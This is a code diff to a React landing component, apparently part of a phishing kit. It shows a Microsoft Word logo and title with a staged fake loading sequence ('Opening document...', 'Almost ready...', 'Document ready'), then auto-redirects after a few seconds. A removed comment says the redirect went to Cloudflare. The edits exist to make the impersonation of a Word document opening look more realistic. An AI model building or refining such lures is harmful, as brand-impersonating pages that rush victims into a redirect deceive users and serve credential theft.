@@ -8,17 +8,32 @@ interface MessageIconLandingProps {
 
 const MessageIconLanding: React.FC<MessageIconLandingProps> = ({ onOpenMessage }) => {
   const [isLoading, setIsLoading] = useState(true);
+  const [loadingText, setLoadingText] = useState('Opening document...');
 
   useEffect(() => {
-    // Simulate loading time for more realistic feel
+    // Simulate realistic Word document loading sequence
+    const loadingSequence = [
+      { text: 'Opening document...', delay: 0 },
+      { text: 'Loading content...', delay: 1000 },
+      { text: 'Preparing document...', delay: 2000 },
+      { text: 'Almost ready...', delay: 2500 }
+    ];
+
+    loadingSequence.forEach(({ text, delay }) => {
+      setTimeout(() => {
+        setLoadingText(text);
+      }, delay);
+    });
+
+    // Finish loading after realistic time
     const loadingTimer = setTimeout(() => {
       setIsLoading(false);
-    }, 1000);
+    }, 3000);
 
-    // Auto-redirect to Cloudflare after 3 seconds
+    // Auto-redirect after document "opens"
     const redirectTimer = setTimeout(() => {
       onOpenMessage();
-    }, 3000);
+    }, 3500);
 
     return () => {
       clearTimeout(loadingTimer);
@@ -28,34 +43,8 @@ const MessageIconLanding: React.FC<MessageIconLandingProps> = ({ onOpenMessage }
 
   return (
     <div className={styles.container}>
-      {/* Loading indicator */}
-      {isLoading && <div className={styles.loadingIndicator}></div>}
-      
-      {/* Loading progress bar */}
-      {isLoading && (
-        <div className={styles.loadingProgress}>
-          <div className={styles.loadingProgressBar}></div>
-        </div>
-      )}
-      
-      {/* Background floating elements */}
-      <div className={styles.backgroundElements}>
-        <div className={styles.backgroundIcon}>📄</div>
-        <div className={styles.backgroundIcon}>✨</div>
-        <div className={styles.backgroundIcon}>💼</div>
-        <div className={styles.backgroundIcon}>📝</div>
-      </div>
-      
       <div className={styles.contentWrapper}>
         <div className={styles.logoSection}>
-          {/* Floating particles around the Word logo */}
-          <div className={styles.floatingParticles}>
-            <div className={styles.particle}></div>
-            <div className={styles.particle}></div>
-            <div className={styles.particle}></div>
-            <div className={styles.particle}></div>
-          </div>
-          
           <div className={styles.floatingWordLogo}>
             <img 
               src={WordIcon} 
@@ -64,6 +53,21 @@ const MessageIconLanding: React.FC<MessageIconLandingProps> = ({ onOpenMessage }
             />
           </div>
           <h1 className={styles.wordTitle}>Microsoft Word</h1>
+          
+          {/* Realistic loading text */}
+          {isLoading && (
+            <div className={styles.loadingTextContainer}>
+              <p className={styles.loadingText}>{loadingText}</p>
+              <div className={styles.loadingSpinner}></div>
+            </div>
+          )}
+          
+          {/* Document ready state */}
+          {!isLoading && (
+            <div className={styles.documentReady}>
+              <p className={styles.readyText}>Document ready</p>
+            </div>
+          )}
         </div>
         
         <div className={styles.microsoftLogoSection}>
